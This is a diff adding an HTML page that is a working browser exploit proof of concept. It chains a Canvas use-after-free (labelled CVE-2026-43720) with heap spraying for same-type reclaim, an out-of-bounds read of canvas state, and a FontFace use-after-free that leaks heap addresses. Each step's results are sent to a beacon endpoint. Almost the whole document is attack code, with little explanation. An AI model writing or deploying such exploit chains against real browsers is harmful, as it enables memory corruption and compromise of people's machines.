@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P812</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+</style>
+</head><body>
+<pre id="o">P812 — Canvas UAF crash oracle + OOB state stack info leak</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s){O.textContent+='\n'+s;}
+function bn(t,d){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon.php?tag=P812-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+function h16(v){return('0000000000000000'+BigInt(v||0).toString(16)).slice(-16);}
+
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_bu=new BigUint64Array(_b8);
+function f2h(v){_f64[0]=v;return h16(_bu[0]);}
+function isPtr(hex){
+  var hi=parseInt(hex.slice(0,8),16)||0;
+  if(hi>=0x10&&hi<=0x1F) return 'HEAP';
+  if(hi===0&&parseInt(hex.slice(8),16)>=0x400000) return 'CODE';
+  if(hi>=0x100&&hi<=0xFFF) return 'MODULE';
+  return '';
+}
+
+bn('BOOT','v1');
+log('Phase 1: Canvas UAF trigger + same-type reclaim...');
+
+/* ========== PHASE 1: Canvas UAF (CVE-2026-43720) ========== */
+var innerCtx=null;
+var canvas=document.createElement('canvas');
+canvas.width=1;canvas.height=1;
+
+var opts={};
+Object.defineProperty(opts,'alpha',{
+  get:function(){
+    innerCtx=canvas.getContext('2d');
+    return true;
+  }
+});
+canvas.getContext('bitmaprenderer',opts);
+
+if(!innerCtx){
+  bn('FAIL','no_innerCtx');
+  log('FAIL: innerCtx not created');
+}else{
+  bn('UAF-OK','innerCtx_created');
+  log('UAF triggered, innerCtx alive');
+}
+
+/* ========== PHASE 2: Same-type reclaim spray ========== */
+var SPRAY=500;
+var sprayCanvases=[];
+var sprayCtxs=[];
+var MARKER=7777.77;
+
+for(var i=0;i<SPRAY;i++){
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var ctx=c.getContext('2d');
+  ctx.lineWidth=MARKER;
+  sprayCanvases.push(c);
+  sprayCtxs.push(ctx);
+}
+
+/* Check if innerCtx now reads the marker */
+var readLW;
+try{readLW=innerCtx.lineWidth;}catch(e){readLW=-1;}
+
+var aliasIdx=-1;
+if(readLW===MARKER){
+  bn('RECLAIM-HIT','lw='+readLW);
+  log('Same-type reclaim HIT! lineWidth='+readLW);
+
+  /* Find which spray context is the alias */
+  innerCtx.lineWidth=8888.88;
+  for(var i=0;i<SPRAY;i++){
+    if(sprayCtxs[i].lineWidth===8888.88){
+      aliasIdx=i;
+      break;
+    }
+  }
+  bn('ALIAS','idx='+aliasIdx);
+  log('Alias at spray index '+aliasIdx);
+}else{
+  bn('RECLAIM-MISS','lw='+readLW);
+  log('Reclaim MISS (lw='+readLW+') — reloading...');
+  setTimeout(function(){location.reload();},300);
+}
+
+if(aliasIdx>=0){
+  var stale=innerCtx;
+  var live=sprayCtxs[aliasIdx];
+
+  /* ========== PHASE 3: Bidirectional R/W confirmation ========== */
+  live.lineWidth=1234.56;
+  var rLW=stale.lineWidth;
+  bn('RW-CHECK','set=1234.56|read='+rLW+'|match='+(rLW===1234.56));
+  log('R/W check: write 1234.56 via live, read '+rLW+' via stale — '+(rLW===1234.56?'OK':'FAIL'));
+
+  /* setLineDash / getLineDash test */
+  var testDash=[11.11,22.22,33.33,44.44,55.55];
+  live.setLineDash(testDash);
+  var readDash=stale.getLineDash();
+  var dashMatch=readDash.length===testDash.length;
+  if(dashMatch){
+    for(var d=0;d<testDash.length;d++){
+      if(readDash[d]!==testDash[d]){dashMatch=false;break;}
+    }
+  }
+  bn('DASH-CHECK','len='+readDash.length+'|match='+dashMatch);
+  log('Dash check: len='+readDash.length+' match='+dashMatch);
+
+  /* getTransform test */
+  live.setTransform(1,2,3,4,5,6);
+  var t=stale.getTransform();
+  bn('TRANSFORM','a='+t.a+'|b='+t.b+'|c='+t.c+'|d='+t.d+'|e='+t.e+'|f='+t.f);
+  log('Transform: a='+t.a+' b='+t.b+' c='+t.c+' d='+t.d+' e='+t.e+' f='+t.f);
+
+  /* ========== PHASE 4: OOB State Stack Read (save-count mismatch) ========== */
+  /*
+   * The key insight from pastawithpesto V665:
+   * If innerCtx had N saves before the UAF, m_stateStack.m_size = N+1
+   * After reclaim, live ctx has m_size=1 (fresh)
+   * Reading through stale wrapper uses STALE m_size
+   * stale.lineWidth → m_stateStack.last() → buffer[N] → OOB read
+   *
+   * But we need the saves to happen BEFORE the free.
+   * In CVE-2026-43720: innerCtx is created inside the getter.
+   * We can do saves inside the getter too, before returning.
+   */
+
+  log('');
+  log('Phase 4: Testing OOB state stack read...');
+
+  /* Do a SECOND UAF with saves inside the getter */
+  var innerCtx2=null;
+  var canvas2=document.createElement('canvas');
+  canvas2.width=1;canvas2.height=1;
+  var NSAVES=8;
+
+  var opts2={};
+  Object.defineProperty(opts2,'alpha',{
+    get:function(){
+      innerCtx2=canvas2.getContext('2d');
+      /* Do saves to grow m_stateStack BEFORE the free */
+      for(var s=0;s<NSAVES;s++){
+        innerCtx2.save();
+      }
+      /* m_stateStack.m_size is now NSAVES+1 */
+      return true;
+    }
+  });
+  canvas2.getContext('bitmaprenderer',opts2);
+
+  if(!innerCtx2){
+    bn('UAF2-FAIL','no_ctx');
+    log('Second UAF failed');
+  }else{
+    bn('UAF2-OK','saves='+NSAVES);
+    log('Second UAF OK with '+NSAVES+' saves');
+
+    /* Same-type reclaim for second UAF */
+    var spray2=[];
+    var MARKER2=5555.55;
+    for(var i=0;i<500;i++){
+      var c=document.createElement('canvas');
+      c.width=1;c.height=1;
+      var ctx=c.getContext('2d');
+      ctx.lineWidth=MARKER2;
+      spray2.push({c:c,ctx:ctx});
+    }
+
+    var readLW2;
+    try{readLW2=innerCtx2.lineWidth;}catch(e){readLW2=-1;}
+
+    if(readLW2===MARKER2){
+      bn('RECLAIM2-HIT','lw='+readLW2);
+      log('Second reclaim HIT!');
+
+      /* Now the magic: stale innerCtx2 has m_size=9 (8 saves + 1)
+       * but the reclaimed live ctx has m_size=1
+       * Reading lineWidth through innerCtx2 should read:
+       *   m_stateStack.last() = buffer[8]
+       *   = offset 8 * sizeof(State) from buffer start
+       *   = 8 * ~400 bytes = ~3200 bytes past buffer start
+       *   = ~2800 bytes past the 1-State inline buffer end
+       * This reads adjacent heap memory as float64!
+       */
+
+      /* Read OOB values through stale wrapper's various fields */
+      var oobResults=[];
+      try{
+        var oobLW=innerCtx2.lineWidth;
+        var hex=f2h(oobLW);
+        var cls=isPtr(hex);
+        oobResults.push('lineWidth='+oobLW+'|hex=0x'+hex+'|'+cls);
+        bn('OOB-LW','0x'+hex+'|cls='+cls+'|val='+oobLW);
+        log('OOB lineWidth = 0x'+hex+' ('+cls+') raw='+oobLW);
+      }catch(e){
+        bn('OOB-LW-ERR',e.message);
+        log('OOB lineWidth error: '+e.message);
+      }
+
+      try{
+        var oobML=innerCtx2.miterLimit;
+        var hex=f2h(oobML);
+        var cls=isPtr(hex);
+        oobResults.push('miterLimit='+oobML+'|hex=0x'+hex+'|'+cls);
+        bn('OOB-ML','0x'+hex+'|cls='+cls+'|val='+oobML);
+        log('OOB miterLimit = 0x'+hex+' ('+cls+') raw='+oobML);
+      }catch(e){
+        bn('OOB-ML-ERR',e.message);
+        log('OOB miterLimit error: '+e.message);
+      }
+
+      try{
+        var oobGA=innerCtx2.globalAlpha;
+        var hex=f2h(oobGA);
+        var cls=isPtr(hex);
+        oobResults.push('globalAlpha='+oobGA+'|hex=0x'+hex+'|'+cls);
+        bn('OOB-GA','0x'+hex+'|cls='+cls+'|val='+oobGA);
+        log('OOB globalAlpha = 0x'+hex+' ('+cls+') raw='+oobGA);
+      }catch(e){
+        bn('OOB-GA-ERR',e.message);
+        log('OOB globalAlpha error: '+e.message);
+      }
+
+      /* Try getTransform for 6 doubles at once (48 bytes) */
+      try{
+        var oobT=innerCtx2.getTransform();
+        var vals=[oobT.a,oobT.b,oobT.c,oobT.d,oobT.e,oobT.f];
+        var hexVals=vals.map(function(v){return '0x'+f2h(v);});
+        var ptrs=hexVals.filter(function(h){return isPtr(h.slice(2))!=='';});
+        bn('OOB-TRANSFORM',hexVals.join('|'));
+        log('OOB transform: '+hexVals.join(', '));
+        if(ptrs.length>0){
+          bn('OOB-TRANSFORM-PTRS',ptrs.join('|'));
+          log('*** POINTER CANDIDATES: '+ptrs.join(', ')+' ***');
+        }
+      }catch(e){
+        bn('OOB-TRANSFORM-ERR',e.message);
+        log('OOB transform error: '+e.message);
+      }
+
+      /* Try getLineDash — reads from lineDash Vector in the OOB state */
+      try{
+        var oobDash=innerCtx2.getLineDash();
+        if(oobDash.length>0){
+          var dashHexes=[];
+          for(var d=0;d<Math.min(oobDash.length,20);d++){
+            var hex=f2h(oobDash[d]);
+            dashHexes.push('0x'+hex);
+          }
+          bn('OOB-DASH','len='+oobDash.length+'|'+dashHexes.slice(0,8).join('|'));
+          log('OOB dash len='+oobDash.length+': '+dashHexes.slice(0,8).join(', '));
+          var dashPtrs=dashHexes.filter(function(h){return isPtr(h.slice(2))!=='';});
+          if(dashPtrs.length>0){
+            bn('OOB-DASH-PTRS',dashPtrs.join('|'));
+            log('*** DASH POINTER CANDIDATES: '+dashPtrs.join(', ')+' ***');
+          }
+        }else{
+          bn('OOB-DASH-EMPTY','len=0');
+          log('OOB dash empty (len=0)');
+        }
+      }catch(e){
+        bn('OOB-DASH-ERR',e.message);
+        log('OOB dash error: '+e.message);
+      }
+
+      /* Try fillStyle/strokeStyle — reads color from OOB state */
+      try{
+        var oobFS=innerCtx2.fillStyle;
+        bn('OOB-FS','val='+oobFS);
+        log('OOB fillStyle = '+oobFS);
+      }catch(e){bn('OOB-FS-ERR',e.message);}
+
+      try{
+        var oobSS=innerCtx2.strokeStyle;
+        bn('OOB-SS','val='+oobSS);
+        log('OOB strokeStyle = '+oobSS);
+      }catch(e){bn('OOB-SS-ERR',e.message);}
+
+    }else{
+      bn('RECLAIM2-MISS','lw='+readLW2);
+      log('Second reclaim MISS — reloading...');
+      setTimeout(function(){location.reload();},300);
+    }
+  }
+
+  /* ========== PHASE 5: Read self_addr via CSSFontFace UAF (for heap reference) ========== */
+  log('');
+  log('Phase 5: CSSFontFace UAF for heap address reference...');
+
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st);
+  var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+  document.fonts.add(face);
+  void face.loaded;
+
+  var fabs=[],ffired=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(ffired)return undefined;
+      ffired=true;
+      if(st){st.remove();st.textContent='';st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      fabs=[];
+      for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em bb1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}
+  });
+  document.fonts.load('1em f1, bb1','AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var bestI=-1,bestNz=0;
+    for(var i=0;i<fabs.length;i++){
+      var u=new Uint8Array(fabs[i]),nz=0;
+      for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+      if(nz>bestNz){bestNz=nz;bestI=i;}
+    }
+    if(bestI>=0&&bestNz>=4){
+      var bv=new DataView(fabs[bestI]);
+      var q11hi=bv.getUint32(0x5C,true);
+      var q11lo=bv.getUint32(0x58,true);
+      var borrow=(q11lo<0x68)?1:0;
+      var selfHi=q11hi-borrow;
+      var selfLo=(q11lo-0x68)>>>0;
+      var selfAddr='0x'+selfHi.toString(16)+('00000000'+selfLo.toString(16)).slice(-8);
+      bn('FONT-SELF',selfAddr);
+      log('FontFace self_addr = '+selfAddr);
+    }else{
+      bn('FONT-MISS','nz='+bestNz);
+      log('FontFace reclaim missed (nz='+bestNz+')');
+    }
+
+    bn('DONE','all_phases_complete');
+    log('');
+    log('=== P812 COMPLETE ===');
+  },500);
+}
+</script></body></html>
